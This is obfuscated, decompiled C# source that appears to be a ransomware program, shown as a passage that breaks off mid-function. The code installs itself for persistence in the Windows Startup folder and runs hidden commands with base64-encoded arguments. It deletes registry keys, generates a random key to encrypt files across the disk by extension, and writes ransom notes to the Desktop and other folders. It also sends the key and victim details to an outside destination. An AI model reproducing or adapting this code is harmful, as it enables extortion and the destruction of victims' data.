	public static string PdbbQHuALFK;

	public static string cONWpzhRjVMgFFx;

	public static string ePzQPhveUhWlVqR;

	public static string gYArJbPZXqc;

	public static string fjXGCiDvGtI;

	public static string PeyEcwpHdsoP;

	public static string ndkamOclOKnVzv;

	public static string mmEKKRaGkloGcs;

	public static string dpYnCeeOXRK;

	public static string tczWceTePBNk;

	public static string uQIcndqWKi;

	public static string rLXXesjrDyx;

	public static string JOcipvPYcTk;

	public static string PntwKUgOTt;

	public static string ZxiAJVQkOJDu;

	public static string jDqdPPwKfsddQK;

	public static string[] neDnepJoXuKRz;

	public static string hEPyWDyzsMB;

	public static bool USeABfWDSTq;

	public static string qblzYDGPsQVpSW;

	public static bool lPNPDgvBRE;

	public static bool zmxvEjsHnfbn;

	public static bool QsoMeYyWMnmx;

	public static bool ygakoNEzKgXaDh;

	public static string AJkkstCArH;

	public static bool IyKNhTqRuk;

	public static bool UaNQOmUgyjoiBm;

	public static bool BnwSrkzPcxb;

	public static bool wvpBCFJLeJ;

	public static bool NHbEtBQcjaHtXtG;

	public static string IeDcjQWHRqqVRp;

	public static bool jFyBcBKPTJEuUw;

	public static Stopwatch mnyvtnKGKARfh;

	public static int LuhgDZXWifkSE;

	public static int UOSpFwBdRnM;

	public static bool yemgLyczOOW;

	public static string htotHetAeUsCN;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegated;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate15;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		if (args.Length == 0 && jlIrvgyvehPHe == getString_0(107396936))
		{
			try
			{
				pmaItEcijum CS_0024_003C_003E8__locals0 = new pmaItEcijum();
				CS_0024_003C_003E8__locals0.BefoimJsrvHKixL = Process.GetCurrentProcess().ProcessName;
				if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.BefoimJsrvHKixL) > 1)
				{
					return;
				}
			}
			catch (Exception)
			{
			}
		}
		if (args.Length == 0 && jlIrvgyvehPHe == getString_0(107396936))
		{
			try
			{
				kIrEUUGTsWgR.pDTWrmJMOfjb(wQjfgLhqCXKC);
			}
			catch (Exception)
			{
			}
		}
		try
		{
			if (JOcipvPYcTk == getString_0(107396931))
			{
				Thread thread = new Thread(blzsoUGAkjIn.iqSbtFgDQQLjWG);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (sermcGnhtRVId == getString_0(107396931))
		{
			Thread.Sleep(int.Parse(wgVMZrFOOvZlc));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && HTzSscqOJXN == getString_0(107396931))
		{
			try
			{
				gyFYwSpmSsCg(KPabEeiJZVewrU(getString_0(107396926)));
			}
			catch
			{
			}
		}
		try
		{
			if (XTrbCENWNoq == getString_0(107396931) && KLnJNAUKDIc.oqgcUARHaol())
			{
				new nSdQzcSxKjAf().XeanfyAjwjiCMvK(bool_0: false);
				KLnJNAUKDIc.NaDfTUzcEFwZ();
			}
		}
		catch (Exception)
		{
		}
		if (YrItydhffRwf == getString_0(107396931) && KLnJNAUKDIc.oqgcUARHaol())
		{
			new nSdQzcSxKjAf().XeanfyAjwjiCMvK(bool_0: false);
			new nSdQzcSxKjAf().IygBAHmYJnC();
		}
		if (ugDAsDtkIuFHI == getString_0(107396931))
		{
			KklymiLsbflc.TGozaZLalxfx();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396789);
			string text2 = text + Path.GetFileName(fileName);
			if (eBqVrsmuLSGvlL == getString_0(107396931) && fileName != text2)
			{
				Thread thread2 = new Thread(ykqSLKWtGtW);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (gETRgNgBKYX == getString_0(107396931) && mainModule != null && fileName != text2)
			{
				try
				{
					KYeUqtAhrujU = TaYVjlHfXwH(0, PtQdinOAWGzwYsV.Count);
					File.Copy(fileName, text + PtQdinOAWGzwYsV[KYeUqtAhrujU], overwrite: true);
					Process.Start(text + PtQdinOAWGzwYsV[KYeUqtAhrujU]);
					KNIARyPOBX();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (XtJDIFKdBObFiw == getString_0(107396931) && DateTime.Now < bpInvtMjNHqeLp)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (EXDBcCojQQvCl == getString_0(107396931) && DateTime.Now > tGMUsFQXYBMSN)
			{
				KNIARyPOBX();
			}
		}
		catch
		{
		}
		FHFmYlsWHhT();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegated == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegated = delegate
			{
				List<string> wjOvnLHSLKhV = WjOvnLHSLKhV;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
					{
						fMeAFAnEJct(getString_0(107390936), string_0);
					};
				}
				Parallel.ForEach(wjOvnLHSLKhV, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				List<string> wWPgOUxUtifS = WWPgOUxUtifS;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
					{
						fMeAFAnEJct(getString_0(107390927), string_0);
					};
				}
				Parallel.ForEach(wWPgOUxUtifS, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				List<string> zSYMvlDWxYEtJZO = ZSYMvlDWxYEtJZO;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						fMeAFAnEJct(KPabEeiJZVewrU(getString_0(107390946)), string_0);
					};
				}
				Parallel.ForEach(zSYMvlDWxYEtJZO, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				if (jDqdPPwKfsddQK == getString_0(107396931))
				{
					string[] source = neDnepJoXuKRz;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
						{
							fMeAFAnEJct(KPabEeiJZVewrU(getString_0(107390946)), getString_0(107390921) + string_0 + getString_0(107390912));
						};
					}
					Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				}
				if (!NvfCSlJqoNa().Contains(getString_0(107390609)))
				{
					TYQBnJQaPlD(LABFsmtCCegTkuJ);
				}
				else
				{
					List<string> source2 = bverOuZzCjzkYh;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
						{
							fMeAFAnEJct(KPabEeiJZVewrU(ITFOBjLBjn(getString_0(107390875))), string_0);
						};
					}
					Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
				}
				List<string> source3 = cIDpbJJYzpDACkyZ;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
					{
						fMeAFAnEJct(KPabEeiJZVewrU(getString_0(107390882)), string_0);
					};
				}
				Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
				List<string> source4 = zziMgJgWEnmo;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
					{
						fMeAFAnEJct(getString_0(107390833), string_0);
					};
				}
				Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegated);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && QsoMeYyWMnmx)
			{
				try
				{
					Thread thread4 = new Thread(hDcWxlHdMAx.NOekTfBuhSu);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			fMeAFAnEJct(getString_0(107396784), KPabEeiJZVewrU(getString_0(107396803)));
			fMeAFAnEJct(getString_0(107396784), KPabEeiJZVewrU(getString_0(107397210)));
			fMeAFAnEJct(KPabEeiJZVewrU(getString_0(107397185)), KPabEeiJZVewrU(getString_0(107397140)));
			fMeAFAnEJct(KPabEeiJZVewrU(getString_0(107397185)), KPabEeiJZVewrU(getString_0(107397010)));
		}
		SecureString secureString = new SecureString();
		if (PslbkyAstfhCvy == getString_0(107396936))
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			zVrwuHAUxLyay = getString_0(107396388);
		}
		tjcGwWrURUFJ = cEUhIAxhKY.KMmlqOtzJnQsiYY(zWVknBlRibmfa(secureString));
		if (BnwSrkzPcxb)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), IeDcjQWHRqqVRp)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), IeDcjQWHRqqVRp), string.Concat(KPabEeiJZVewrU(getString_0(107396311)), new WebClient().DownloadString(KPabEeiJZVewrU(getString_0(107396318))), getString_0(107396245), KPabEeiJZVewrU(getString_0(107396240)), DateTime.Now, getString_0(107396245), KPabEeiJZVewrU(getString_0(107396231)), tjcGwWrURUFJ));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), IeDcjQWHRqqVRp), getString_0(107396654) + tjcGwWrURUFJ);
				}
			}
			catch (Exception ex7)
			{
				if (IyKNhTqRuk)
				{
					try
					{
						File.AppendAllText(AJkkstCArH, getString_0(107396625) + ex7.Message + getString_0(107396245));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		JNToQHUJVI.xtpOcodprvzBkz(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), ndkamOclOKnVzv), zpdJPJGqPYGV(tjcGwWrURUFJ), null, null, getString_0(107396608), getString_0(107396559), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			WuUUchilOZc();
		}
		try
		{
			APEsCqwAGhY(new string[1] { getString_0(107396574) }, new string[100]
			{
				getString_0(107396533),
				getString_0(107396528),
				getString_0(107396555),
				getString_0(107396546),
				getString_0(107396541),
				getString_0(107396504),
				getString_0(107396499),
				getString_0(107396494),
				getString_0(107396521),
				getString_0(107396516),
				getString_0(107396511),
				getString_0(107396474),
				getString_0(107396465),
				getString_0(107396460),
				getString_0(107396483),
				getString_0(107396478),
				getString_0(107395929),
				getString_0(107395924),
				getString_0(107395919),
				getString_0(107395946),
				getString_0(107395937),
				getString_0(107395932),
				getString_0(107395895),
				getString_0(107395890),
				getString_0(107395885),
				getString_0(107395912),
				getString_0(107395907),
				getString_0(107395902),
				getString_0(107395865),
				getString_0(107395860),
				getString_0(107395855),
				getString_0(107395882),
				getString_0(107395877),
				getString_0(107395872),
				getString_0(107395831),
				getString_0(107395826),
				getString_0(107395821),
				getString_0(107395848),
				getString_0(107396499),
				getString_0(107395843),
				getString_0(107396521),
				getString_0(107395802),
				getString_0(107395797),
				getString_0(107395792),
				getString_0(107395819),
				getString_0(107395814),
				getString_0(107395809),
				getString_0(107395804),
				getString_0(107395767),
				getString_0(107395762),
				getString_0(107395757),
				getString_0(107395784),
				getString_0(107395779),
				getString_0(107395774),
				getString_0(107395737),
				getString_0(107395732),
				getString_0(107395727),
				getString_0(107395754),
				getString_0(107395745),
				getString_0(107395740),
				getString_0(107395699),
				getString_0(107395718),
				getString_0(107395843),
				getString_0(107396185),
				getString_0(107396176),
				getString_0(107396199),
				getString_0(107396190),
				getString_0(107396149),
				getString_0(107396140),
				getString_0(107396167),
				getString_0(107396158),
				getString_0(107396117),
				getString_0(107396108),
				getString_0(107396135),
				getString_0(107396130),
				getString_0(107396125),
				getString_0(107396088),
				getString_0(107396083),
				getString_0(107396078),
				getString_0(107396101),
				getString_0(107396096),
				getString_0(107396059),
				getString_0(107396054),
				getString_0(107396049),
				getString_0(107396044),
				getString_0(107396067),
				getString_0(107396026),
				getString_0(107396021),
				getString_0(107395877),
				getString_0(107396016),
				getString_0(107396043),
				getString_0(107396038),
				getString_0(107396033),
				getString_0(107396028),
				getString_0(107395987),
				getString_0(107395982),
				getString_0(107396009),
				getString_0(107396000),
				getString_0(107395963),
				getString_0(107395958)
			}, new string[0], zWVknBlRibmfa(secureString), getString_0(107395953));
		}
		catch (Exception ex9)
		{
			if (IyKNhTqRuk)
			{
				try
				{
					File.AppendAllText(AJkkstCArH, getString_0(107395432) + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395375)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395375));
				streamWriter.WriteLine(KPabEeiJZVewrU(getString_0(107395342)));
				streamWriter.WriteLine(getString_0(107396245));
				streamWriter.WriteLine(KPabEeiJZVewrU(getString_0(107393324)));
				streamWriter.WriteLine(tjcGwWrURUFJ);
				if (uJRCtLGzhdwU == getString_0(107396936))
				{
					streamWriter.WriteLine(getString_0(107396245));
					streamWriter.WriteLine(KPabEeiJZVewrU(getString_0(107393323)) + Convert.ToString(faYAKmARedHa.Count));
				}
				if (yemgLyczOOW)
				{
					streamWriter.WriteLine(getString_0(107396245));
					streamWriter.WriteLine(KPabEeiJZVewrU(getString_0(107393246)));
					streamWriter.WriteLine(pkkGXNrkowS.NOJMgYxKOBYDCh());
				}
			}
			else
			{
				string text3 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395375));
				if (!text3.Contains(tjcGwWrURUFJ) && !lPNPDgvBRE)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395375), getString_0(107393213) + tjcGwWrURUFJ);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in eWoKDGBNuJT)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395375)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395375), item + getString_0(107395375), overwrite: true);
				}
				else
				{
					string text4 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395375));
					if (!text4.Contains(tjcGwWrURUFJ) && !lPNPDgvBRE)
					{
						File.AppendAllText(item + getString_0(107395375), getString_0(107393213) + tjcGwWrURUFJ);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!ygakoNEzKgXaDh && num > 10)
			{
				break;
			}
		}
		if (tczWceTePBNk == getString_0(107396931))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393184)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393184));
					streamWriter2.WriteLine(KPabEeiJZVewrU(getString_0(107393151)));
					streamWriter2.WriteLine(getString_0(107396245));
					streamWriter2.WriteLine(KPabEeiJZVewrU(getString_0(107393614)));
					streamWriter2.WriteLine(tjcGwWrURUFJ + KPabEeiJZVewrU(getString_0(107393525)));
					if (uJRCtLGzhdwU == getString_0(107396936))
					{
						streamWriter2.WriteLine(getString_0(107396245));
						streamWriter2.WriteLine(KPabEeiJZVewrU(getString_0(107393544)) + KPabEeiJZVewrU(getString_0(107393323)) + Convert.ToString(faYAKmARedHa.Count) + KPabEeiJZVewrU(getString_0(107393525)));
					}
					if (yemgLyczOOW)
					{
						streamWriter2.WriteLine(getString_0(107396245));
						streamWriter2.WriteLine(KPabEeiJZVewrU(getString_0(107393246)));
						streamWriter2.WriteLine(pkkGXNrkowS.NOJMgYxKOBYDCh());
					}
				}
				else
				{
					string text5 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395375));
					if (!text5.Contains(tjcGwWrURUFJ) && !lPNPDgvBRE)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393184), KPabEeiJZVewrU(getString_0(107393544)) + getString_0(107393213) + tjcGwWrURUFJ + KPabEeiJZVewrU(getString_0(107393525)));
					}
				}
			}
			catch
			{
			}
		}
		if (DOzTZyFxEotdrJ == getString_0(107396931))
		{
			try
			{
				if (uJRCtLGzhdwU == getString_0(107396936))
				{
					pkkGXNrkowS.XPwCeKFjLVREhb(getString_0(107393483), getString_0(107393478), getString_0(107393433), string.Concat(KPabEeiJZVewrU(getString_0(107396311)), new WebClient().DownloadString(KPabEeiJZVewrU(getString_0(107396318))), getString_0(107393424), KPabEeiJZVewrU(getString_0(107396240)), DateTime.Now, getString_0(107396245), KPabEeiJZVewrU(getString_0(107393451)), Convert.ToString(faYAKmARedHa.Count), getString_0(107396245), KPabEeiJZVewrU(getString_0(107396231)), tjcGwWrURUFJ));
				}
				else
				{
					pkkGXNrkowS.XPwCeKFjLVREhb(getString_0(107393483), getString_0(107393478), getString_0(107393433), string.Concat(KPabEeiJZVewrU(getString_0(107396311)), new WebClient().DownloadString(KPabEeiJZVewrU(getString_0(107396318))), getString_0(107393424), KPabEeiJZVewrU(getString_0(107396240)), DateTime.Now, getString_0(107396245), KPabEeiJZVewrU(getString_0(107393451)), Convert.ToString(faYAKmARedHa.Count), getString_0(107396245), KPabEeiJZVewrU(getString_0(107396231)), tjcGwWrURUFJ));
				}
			}
			catch
			{
			}
		}
		if (rwgmXYownudC == getString_0(107396931))
		{
			try
			{
				xcvGbHyHJILZvdyDt.kVGnUJKoJwfLVS(new Uri(getString_0(107392858)));
			}
			catch
			{
			}
		}
		if (tczWceTePBNk == getString_0(107396936))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395375)))
				{
					Process.Start(KPabEeiJZVewrU(getString_0(107392857)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395375));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393184)))
				{
					Process.Start(KPabEeiJZVewrU(getString_0(107392864)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393184));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(mxdlyhKIDSTRaTYm))
		{
			try
			{
				File.Delete(mxdlyhKIDSTRaTYm);
			}
			catch
			{
			}
		}
		if (IyKNhTqRuk)
		{
			try
			{
				File.AppendAllText(AJkkstCArH, getString_0(107392815));
			}
			catch (Exception)
			{
			}
		}
		if (bYxBeUFQrvjc == getString_0(107392834))
		{
			KNIARyPOBX();
		}
	}

	public static void ykqSLKWtGtW()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(KPabEeiJZVewrU(getString_0(107392793)), KPabEeiJZVewrU(getString_0(107392671)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int TaYVjlHfXwH(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> nWCAXKctddiO(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107392622)) && !text.Contains(getString_0(107393109)) && !text.Contains(getString_0(107393076)) && !text.ToLower().Contains(getString_0(107393091)) && !text.ToLower().Contains(getString_0(107393046)) && !text.Contains(getString_0(107393053)) && !text.Contains(getString_0(107393032)) && !text.ToLower().Contains(getString_0(107392983)) && !text.ToLower().Contains(getString_0(107393002)) && !text.ToLower().Contains(getString_0(107392965)) && !text.ToLower().Contains(getString_0(107392956)) && !text.ToLower().Contains(getString_0(107392939)) && !text.ToLower().Contains(getString_0(107392926)) && !text.ToLower().Contains(getString_0(107392881)) && !text.ToLower().Contains(getString_0(107392892)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107392355)) && !fileInfo.FullName.Contains(getString_0(107392306)) && !fileInfo.FullName.Contains(getString_0(107392321)) && !fileInfo.FullName.Contains(getString_0(107392272)) && !fileInfo.FullName.Contains(getString_0(107392287)) && !fileInfo.FullName.Contains(getString_0(107392238)) && !fileInfo.FullName.Contains(getString_0(107392253)) && !fileInfo.FullName.Contains(getString_0(107392204)) && !fileInfo.FullName.Contains(getString_0(107392223)) && !fileInfo.FullName.Contains(getString_0(107392202)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392189)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392144)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392159)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392110)) && !fileInfo.FullName.Contains(KPabEeiJZVewrU(getString_0(107392125))) && !fileInfo.FullName.Contains(getString_0(107392612)) && !fileInfo.FullName.Contains(getString_0(107392567)) && !fileInfo.FullName.Contains(getString_0(107392582)) && !fileInfo.FullName.EndsWith(getString_0(107395953)) && !fileInfo.FullName.EndsWith(getString_0(107392525)) && !fileInfo.FullName.EndsWith(getString_0(107392552)) && !fileInfo.FullName.EndsWith(getString_0(107392547)) && !fileInfo.FullName.EndsWith(getString_0(107392542)) && !fileInfo.FullName.Contains(getString_0(107392505)) && !fileInfo.FullName.Contains(ndkamOclOKnVzv) && !fileInfo.FullName.Contains(AJkkstCArH) && !fileInfo.FullName.Contains(IeDcjQWHRqqVRp))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(RECKTQkVejAGfc) * 1024.0 * 1024.0 && MDZDXHRjkgrJzWk == getString_0(107396931))
						{
							list.Add(fileInfo.FullName);
							nQiQBlceKDnd(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && MDZDXHRjkgrJzWk == getString_0(107396936))
						{
							list.Add(fileInfo.FullName);
							nQiQBlceKDnd(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string fMeAFAnEJct(string mLeGFjgAOmi = "", string TpGWpNPUdgT = "")
	{
		string result = getString_0(107392858);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = mLeGFjgAOmi,
				Arguments = TpGWpNPUdgT,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void gyFYwSpmSsCg(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107392520),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string ITFOBjLBjn(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string KPabEeiJZVewrU(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void TYQBnJQaPlD(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = KPabEeiJZVewrU(getString_0(107392471));
		processStartInfo.Arguments = getString_0(107392442) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool MLWevbAvFShYk(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string zWVknBlRibmfa(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void FHFmYlsWHhT()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = ITFOBjLBjn(getString_0(107392437));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(KPabEeiJZVewrU(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(KPabEeiJZVewrU(getString_0(107391819)));
					registryKey.DeleteSubKey(KPabEeiJZVewrU(getString_0(107391762)));
					registryKey.DeleteSubKey(KPabEeiJZVewrU(getString_0(107391777)));
					registryKey.DeleteSubKey(KPabEeiJZVewrU(getString_0(107391752)));
					registryKey.DeleteSubKey(KPabEeiJZVewrU(getString_0(107392471)));
					registryKey.DeleteSubKey(KPabEeiJZVewrU(getString_0(107391695)));
					registryKey.DeleteSubKey(KPabEeiJZVewrU(getString_0(107391666)));
					registryKey.Close();
				}
				string_ = ITFOBjLBjn(getString_0(107391681));
				registryKey = Registry.LocalMachine.OpenSubKey(KPabEeiJZVewrU(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(KPabEeiJZVewrU(getString_0(107392096)));
					registryKey.Close();
				}
				string_ = ITFOBjLBjn(getString_0(107392047));
				registryKey = Registry.LocalMachine.OpenSubKey(KPabEeiJZVewrU(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(KPabEeiJZVewrU(getString_0(107392096)));
					registryKey.Close();
				}
				string_ = ITFOBjLBjn(getString_0(107392047));
				registryKey = Registry.CurrentUser.OpenSubKey(KPabEeiJZVewrU(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(KPabEeiJZVewrU(getString_0(107392096)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			fMeAFAnEJct(KPabEeiJZVewrU(getString_0(107392062)), KPabEeiJZVewrU(getString_0(107392013)));
			fMeAFAnEJct(KPabEeiJZVewrU(getString_0(107391996)), KPabEeiJZVewrU(getString_0(107391955)));
			fMeAFAnEJct(KPabEeiJZVewrU(getString_0(107391996)), KPabEeiJZVewrU(getString_0(107391329)));
			fMeAFAnEJct(KPabEeiJZVewrU(getString_0(107391268)), KPabEeiJZVewrU(getString_0(107391219)));
		}
		catch
		{
		}
	}

	public static void lbMOCvnhGJaBCrXH(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(KPabEeiJZVewrU(getString_0(107391178)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
